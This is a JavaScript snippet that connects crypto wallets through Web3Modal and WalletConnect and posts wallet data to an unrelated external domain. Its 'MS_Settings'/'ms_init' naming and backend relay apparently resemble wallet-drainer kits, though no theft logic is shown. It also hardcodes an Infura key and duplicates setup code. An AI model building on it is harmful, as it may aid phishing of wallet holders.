// Initialize providers
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;

const updatedProviderOptions = {
    walletconnect: {
        package: WalletConnectProvider,
        options: {
            infuraId: "511362d7fcc8491f9af15cc7fadf46ae"
        }
    }
};
const updatedWeb3Modal = new Web3Modal({
    network: "mainnet",
    cacheProvider: true,
    providerOptions: updatedProviderOptions
});
// Rest of your existing code
const API_ENDPOINT = 'fasterdeliveryuae.com';

const providerOptions = {
    walletconnect: {
        package: WalletConnectProvider,
        options: {
            infuraId: "511362d7fcc8491f9af15cc7fadf46ae"
        }
    }
};

const web3Modal = new Web3Modal({
    network: "mainnet",
    cacheProvider: true,
    providerOptions
});

const MS_Settings = {
    RPCs: {
        1: "https://mainnet.infura.io/v3/511362d7fcc8491f9af15cc7fadf46ae",
        56: "https://bsc-dataseed.binance.org/",
        137: "https://polygon-rpc.com"
    },
    chains: {
        1: { name: "Ethereum", explorer: "https://etherscan.io" },
        56: { name: "BSC", explorer: "https://bscscan.com" },
        137: { name: "Polygon", explorer: "https://polygonscan.com" }
    }
};

async function ms_init() {
    try {
        const provider = await web3Modal.connect();
        const web3 = new Web3(provider);
        const accounts = await web3.eth.getAccounts();
        return accounts[0];
    } catch (error) {
        console.log("Connection Error:", error);
    }
}

// Fast wallet connection
async function connectWallet(provider) {
    const accounts = await provider.request({ method: 'eth_requestAccounts' });
    return accounts[0];
}

// Efficient backend communication
async function sendWalletData() {
    const response = await fetch(`${API_ENDPOINT}/wallet`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ connected: true })
    });
    return response.json();
}
